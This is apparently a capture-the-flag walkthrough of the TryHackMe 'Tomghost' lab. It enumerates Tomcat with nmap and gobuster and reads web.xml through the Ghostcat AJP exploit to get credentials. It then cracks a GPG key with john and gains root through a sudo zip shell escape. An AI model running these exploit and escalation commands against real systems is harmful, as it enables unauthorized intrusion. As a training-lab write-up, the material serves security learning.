# Tomghost

At: [TryHackMe](https://tryhackme.com/room/tomghost)
By: [stuxnet](https://tryhackme.com/p/stuxnet)

IP: 10.10.74.167 

## Enum

Always start with an nmap or rustscan

### Nmap

`nmap -sC -sV -vv -oN nmap.txt 10.10.74.167`

Let's break it down:
`-sC` starts nmap with default scripts, and yes! Nmap has an NSE scripting engine. Very cool
</br>
`-sV` makes nmap enumerate services for their versions
</br>
`-vv` sets the output to very verbose
</br>
`-oN nmap.txt` writes a log to nmap.txt

Output:
```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp   open  tcpwrapped syn-ack ttl 63
8009/tcp open  ajp13      syn-ack ttl 63 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       syn-ack ttl 63 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Cool, port `8080` has a webserver running time to check it out:

### WEB

And we are greeted with a general tomcat page. Whenever I see this I use [my tool](https://github.com/xnomas/web-ctf-help) to scrape the website, and get some generally good info:
```
$ webctf http://$IP:8080/

=============
COMMENTS
=============


=============
SCRIPTS
=============


=============
IMAGES
=============

sources:
--------
[+] 1 : tomcat.png

alts:
-----
[+] 1 : [tomcat logo]

===================
INTERESTING HEADERS
===================

```
Okay, cool, no hidden comments. Time for some `gobuster`

#### Gobuster

`gobuster dir -u http://$IP:8080/ -w common.txt -t 20` common.txt can be found in the `/usr/share/wordlists/` directory on Kali:
```
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/host-manager (Status: 302)
/manager (Status: 302)
```
And that is some nice output, now I run a bigger bruteforce in the background with a wordlist like `directory-list-2.3-medium.txt`.

Time to check out the directories

#### Directories

Let's use my tool again on some of the directories to see if there are hidden comments, javascript etc.
Nothing note worthy, so lets look at the `/manager` and `/host-manager` directories:

`/manager`:
We get an access denied, but we also get some default login credentials
```
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```
`/host-manager`:
Again the same.

Now remember one thing. We also had port 8009 with `ajp13`:
```
searchsploit ajp 13
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)       | multiple/webapps/49039.rb
---------------------------------------------------------------------- ---------------------------------
```
Cool! We have an exploit, so I search around on github and found [this](https://github.com/00theway/Ghostcat-CNVD-2020-10487).

### Exploit

Firstly clone the repo over `git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487` and then we can use `ajpshooter` like so:
```
$ ./ajpShooter.py http://$IP 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

```
Lovely output, now let's look a little lower:
```xml
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	sk*****:R E D A C T E D
  </description>

</web-app>
```
We have some creds, awesome! Lets try sshing over to the machine!

## User

Awesome! We are over on the machine, lets have a look around. 

We have two files: `tryhackme.asc` and `creds.pgp` time to get those over to our host:
```bash
python3 -m http.server
wget http://$IP:8000/tryhackme.asc
wget http://$IP:8000/credential.pgp
```
Now we need to crack the `tryhackme.asc` file, so time for `gpg2john` and then passing the hash to `john`!
```bash
$ gpg2john tryhackme.asc > hash
$ john --wordlist=rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******        (tryhackme)
1g 0:00:00:00 DONE (2021-01-25 14:08) 5.000g/s 5370p/s 5370c/s 5370C/s ******..trisha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now that we have the password we can import the key and decrypt the `.pgp` file:
```
$ gpg --import tryhackme.asc // then input the password
$ gpg --output decrypted.txt --decrypt credential.pgp 
``` 
And that gave us some insane creds :D 
```bash
$ cat decrypted.txt 
merlin:***************************************************************
```
Time to `ssh` as merlin and look around 

### Merlin

Awesome, now we have the `user.txt` file. But how can we privesc to root? 

## Privesc

I always run a few commands:
```bash
id <- check my permissions and groups
sudo -l <- what can I run as sudo?
uname -a <- check kernel version
ls /etc/cron <- look at cron jobs
sudo -V <- sudo version?
find / -type f -user root -perm /4000 2>/dev/null <- look for suid binaries
```
And this is what I got:
```bash
merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ 
```
Awesome! We can zip as root, lets check out [gtfobins](gtfobins.github.io/): 
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
time to try it out.... and just pasting that in... bam! Root! I think you can find the `root.txt` now ;)
